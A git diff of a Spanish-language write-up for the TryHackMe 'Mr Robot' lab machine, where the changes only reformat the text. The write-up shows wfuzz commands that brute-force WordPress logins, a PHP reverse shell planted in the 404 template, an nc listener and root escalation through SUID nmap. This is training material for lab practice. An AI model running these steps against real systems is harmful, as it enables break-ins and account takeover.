@@ -3,48 +3,55 @@ title: Máquina|<font color="#5d9b9b">Mr Robot</font>
 published : true
 ---
 
-<p>Nombre : Mr.Robot </p>
+* <p>Nombre : Mr.Robot </p>
 > Url : <a href="https://tryhackme.com/room/mrrobot">Mr.Robot</a>.
-<p></p>
+>
 
 <h2><font color="white"><center># mr.Robot</center></font></h2>
-<p>Empezamos con el reconocimiento, en este caso la ip es : <bold>10.10.94.16</bold></p>
+* <p>Empezamos con el reconocimiento, en este caso la ip es : <bold>10.10.94.16</bold></p>
 > ping -c 1 10.10.94.16
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot1.png"/>
-<p>Por el ttl (64) nos fijamos de que nos enfrentamos a una maquina linux,
+>
+* <p>Por el ttl (64) nos fijamos de que nos enfrentamos a una maquina linux,
 ahora vamos a hacer un reconocimiento de puertos abiertos. </p>
+>
 <img src="/imgs/mrRobot/mrRobot2.png"/>
 <br>
-<p>Vemos que tiene el puerto <font color="lime">80/http</font> y el <font color="lime">444/tcp,</font> ahora vamos a ver el puerto 80 http a ver que nos informa.</p>
+* <p>Vemos que tiene el puerto <font color="lime">80/http</font> y el <font color="lime">444/tcp,</font> ahora vamos a ver el puerto 80 http a ver que nos informa.</p>
+>
 <img src="/imgs/mrRobot/mrRobot3.png"/>
-<p> Si vemos detalladamente todo, observaremos que no mostrara nada relevante, por lo tanto pasamos a la enumeración de <font color="gold"><bold>"DirectoriosActivos"</bold></font>.</p>
-
+* <p> Si vemos detalladamente todo, observaremos que no mostrara nada relevante, por lo tanto pasamos a la enumeración de <font color="gold"><bold>"DirectoriosActivos"</bold></font>.</p>
 > wfuzz -t 200 --hc=404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.94.16/FUZZ
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot4.png"/>
-<p>Entre algunas cosas vemos que nos enumera cosas interesantes como :</p>
-robots.txt | wp-login.php 
-<p>Alguno del resto solo es codigo de estado 301, ahora vamos a ver el robots.txt </p>
+* <p>Entre algunas cosas vemos que nos enumera cosas interesantes como :
+robots.txt | wp-login.php, del resto solo es codigo de estado 301, ahora vamos a ver el robots.txt </p>
+>
 <img src="/imgs/mrRobot/mrRobot5.png"/>
-<p>Al parecer encontramos la llave 1 </p>
+* <p>Al parecer encontramos la llave 1 </p>
+>
 <img src="/imgs/mrRobot/mrRobot6.png"/>
-<p>Ahora descargaremos el archivo fsocity.dic, y leemos que tiene el archivo.</p>
+* <p>Ahora descargaremos el archivo fsocity.dic, y leemos que tiene el archivo.</p>
+>
 <img src="/imgs/mrRobot/mrRobot7.png"/>
-<p>Podemos ver que el archivo <font color="yellow"> fsocity.dic </font> solo parace ser un diccionario.</p>
-<p>Ahora veremos el wp-login.php</p>
+>
+`Podemos ver que el archivo  fsocity.dic  solo parace ser un diccionario.`
+* <p>Ahora veremos el wp-login.php</p>
+>
 <img src="/imgs/mrRobot/mrRobot8.png"/>
-<p>Ahora vemos que es un login asi que teniendo un diccionario que me proporciono la misma pagina web por que no usarlo contra si misma?,</p>
+* <p>Ahora vemos que es un login asi que teniendo un diccionario que me proporciono la misma pagina web por que no usarlo contra si misma?,</p>
 > wfuzz -t 200 -c --hs "Invalid username" -z file,fsocity.dic  -d "log=FUZZ&pwd=NULL" http://10.10.94.16/wp-login.php
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot9.png"/>
-<p>Ok tenemos ya el username <font color="yellow">Eliot</font>, nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
+* <p>Ok tenemos ya el username <font color="yellow">Eliot</font>, nos falta ahora la contraseña, hagamos de nuevo lo mismo.</p>
 > wfuzz -t 200 -c --hc=200  -z file,fsocity.dic -d "log=Elliot&pwd=FUZZ" http://10.10.94.16/wp-login.php
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot10.png"/>
-<p>Ok listo ahora tenemos la contraseña del usuario <font color="yellow">Elliot</font>, ahora solo queda iniciar session en el <font color="yellow">wp-login.php</font>.</p>
+* <p>Ok listo ahora tenemos la contraseña del usuario <font color="yellow">Elliot</font>, ahora solo queda iniciar session en el <font color="yellow">wp-login.php</font>.</p>
+>
 <img src="/imgs/mrRobot/mrRobot11.png"/>
-<p>Una vez adentro tenemos que ganar acceso por medio de una web-shell, para ello me ire a apariencia y la seccion 404. quitare todo el codigo php y lo remplazare por el siguiente</p>
+* <p>Una vez adentro tenemos que ganar acceso por medio de una web-shell, para ello me ire a apariencia y la seccion 404. quitare todo el codigo php y lo remplazare por el siguiente</p>
 
 ```php
 
@@ -195,35 +202,37 @@ function printit ($string) {
 ?> 
 
 ```
-<p>Este archivo lo que hace es que cuando la pagina lance un codigo de estado 404 Not Found lo que haga sea darme una shell por el puerto 5454 a mi direccion Ip, asi que me pondre en escucha por el puerto 5454.</p>
+* <p>Este archivo lo que hace es que cuando la pagina lance un codigo de estado 404 Not Found lo que haga sea darme una shell por el puerto 5454 a mi direccion Ip, asi que me pondre en escucha por el puerto 5454.</p>
 > sudo nc -nlvp 5454
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot12.png"/>
-<p>Ahora guardado una vez los caembios en el panel, vamos a una pagina web del servidor la cual no exista por ejemplo 
+* <p>Ahora guardado una vez los caembios en el panel, vamos a una pagina web del servidor la cual no exista por ejemplo 
 <br><font color="red">http://10.10.94.16/noexisteestapagina</font> y regresamos a nuestra terminal veremos lo siguiente. </p>
+>
 <img src="/imgs/mrRobot/mrRobot13.png"/>
-<p>Una shell listo pero ahora somos deamon vamos a elevar privilegios, veamos que hay adentro del sistema,
+* <p>Una shell listo pero ahora somos deamon vamos a elevar privilegios, veamos que hay adentro del sistema,
 <br>pero antes salgamos del caparazon de la terminal que tenemos con el siguiente comando.</p>
 > python -c "import pty; pty.spwan('/bin/bash')"
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot14.png"/>
-<p>Al hacer un ls en la ruta /home/robot vemos que hay dos archivos uno contiene la segunda llave y el otro es 
-<br>un archivo encriptado en md5</p>
+* <p>Al hacer un ls en la ruta /home/robot vemos que hay dos archivos uno contiene la segunda llave y el otro es un archivo encriptado en md5.</p>
+>
 <img src="/imgs/mrRobot/mrRobot15.png"/>
 
-<p>Vamos a decodificar el hash colocandolo en alguna pagina para decifrarle.</p>
+* <p>Vamos a decodificar el hash colocandolo en alguna pagina para decifrarle.</p>
+>
 <img src="/imgs/mrRobot/mrRobot16.png"/>
 
-<p>El hash al decifrarlo solo era un mensaje de la [a-z]. 
+* <p>El hash al decifrarlo solo era un mensaje de la [a-z]. 
 Ahora usemos ese mensaje decifrado para convertirnos en el usuario robot del sistema, y ver en que permisos de aplicaciones del sitema nos puede ayduar
 para escalar privilegios.</p>
 
 <img src="/imgs/mrRobot/mrRobot17.png"/>
 
-<p>Veamos Si tenemos permssos UID por root con el que podamos aprovecharnos</p>
+* <p>Veamos Si tenemos permssos UID por root con el que podamos aprovecharnos</p>
 > find /usr -perm +6000  \| grep '/bin'
-<p></p>
+>
 <img src="/imgs/mrRobot/mrRobot18.png">
-<p>Vemos que tenemos permisos sobre el binario /usr/local/bin/nmap el cual nos aproavchamos del comando --interactive para ser root</p>
-<p>Listo maquina <font color="red">vulnerada</font> ahora somos root.</p>
+* <p>Vemos que tenemos permisos sobre el binario /usr/local/bin/nmap el cual nos aproavchamos del comando --interactive para ser root</p>
+* <p>Listo maquina <font color="red">vulnerada</font> ahora somos root.</p>
 
